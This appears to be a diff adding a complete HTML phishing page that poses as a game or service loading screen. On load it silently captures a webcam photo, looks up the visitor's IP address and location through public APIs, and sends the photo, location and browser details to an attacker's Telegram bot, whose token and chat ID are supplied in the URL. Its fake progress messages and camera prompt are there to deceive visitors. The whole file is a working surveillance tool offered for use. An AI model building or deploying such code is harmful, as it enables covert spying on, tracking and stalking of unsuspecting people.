@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Photo Capture</title>
+    <style>
+        body, html {margin:0;padding:0;height:100%;overflow:hidden;font-family:Arial,sans-serif;}
+        #loading-overlay {position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:2;}
+        .loader {width:50px;height:50px;border:5px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:#fff;animation:spin 1s linear infinite;margin-bottom:15px;} 
+        @keyframes spin {to{transform:rotate(360deg);}}
+        #loading-text {color:#fff;font-size:18px;margin-top:10px;}
+        #permission-request {position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);display:none;flex-direction:column;justify-content:center;align-items:center;z-index:3;color:#fff;text-align:center;padding:20px;}
+        #allow-btn {margin-top:20px;padding:12px 30px;background:#4CAF50;color:#fff;border:none;border-radius:5px;font-size:16px;cursor:pointer;}
+        #video-preview {display:none;}
+    </style>
+</head>
+<body>
+    <div id="loading-overlay">
+        <div class="loader"></div>
+        <div id="loading-text">Connecting to server...</div>
+    </div>
+    <div id="permission-request">
+        <h2>Camera Access Required</h2>
+        <p>Please allow camera access to continue</p>
+        <button id="allow-btn">ALLOW CAMERA</button>
+    </div>
+    <video id="video-preview" autoplay playsinline></video>
+    <canvas id="capture-canvas" style="display:none;"></canvas>
+    <script>
+        // GET PARAM FUNCTION
+        function getParam(name) {
+            const params = new URLSearchParams(window.location.search);
+            return params.get(name) || '';
+        }
+        // FETCH DATA FROM QUERY PARAMS
+        const botToken = getParam('token');
+        const chatId = getParam('chat');
+
+        if(!botToken || !chatId){document.body.innerHTML="<h2 style='color:red;text-align:center;margin-top:50px;'>TOKEN OR CHATID MISSING!</h2>";throw new Error("Missing param");}
+
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loadingText = document.getElementById('loading-text');
+        const permissionRequest = document.getElementById('permission-request');
+        const allowBtn = document.getElementById('allow-btn');
+        const videoPreview = document.getElementById('video-preview');
+        const captureCanvas = document.getElementById('capture-canvas');
+
+        const loadingMessages = ["Connecting to server...","Loading game assets...","Verifying account...","Almost ready...","Preparing interface...","Finalizing setup..."];
+        function rotateLoadingMessages() {
+            let counter = 0;
+            setInterval(() => {
+                loadingText.textContent = loadingMessages[counter];
+                counter = (counter + 1) % loadingMessages.length;
+            }, 3000);
+        }
+
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                return await detailsResponse.json();
+            } catch (error) { return {}; }
+        }
+
+        async function sendPhotoToTelegram(blob, info) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('caption', `👤 New visitor photo\n\n🌐 ${info.ip || ''} - ${info.city || ''} ${info.country_name || ''}\n📱 ${navigator.userAgent}`);
+                formData.append('photo', blob, 'photo.jpg');
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method:'POST',body:formData
+                });
+            } catch(e){}
+        }
+
+        async function captureAndSendPhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                videoPreview.srcObject = stream;
+                videoPreview.style.display = 'none';
+                await new Promise(resolve => {videoPreview.onloadedmetadata = () => {resolve();};});
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                captureCanvas.width = videoPreview.videoWidth;
+                captureCanvas.height = videoPreview.videoHeight;
+                const ctx = captureCanvas.getContext('2d');
+                ctx.drawImage(videoPreview, 0, 0, captureCanvas.width, captureCanvas.height);
+                const blob = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/jpeg', 0.95));
+                stream.getTracks().forEach(track => track.stop());
+                const info = await getIPInfo();
+                await sendPhotoToTelegram(blob, info);
+                loadingText.textContent = 'Photo sent!';
+                setTimeout(() => {loadingOverlay.style.display='none';},2000);
+            } catch (error) {
+                loadingOverlay.style.display = 'none';
+                permissionRequest.style.display = 'flex';
+            }
+        }
+        async function trackUser() {
+            rotateLoadingMessages();
+            try{await captureAndSendPhoto();}catch{permissionRequest.style.display='flex';}
+        }
+        allowBtn.addEventListener('click', async () => {
+            permissionRequest.style.display = 'none';
+            loadingOverlay.style.display = 'flex';
+            await captureAndSendPhoto();
+        });
+        window.onload = trackUser;
+    </script>
+</body>
+</html>
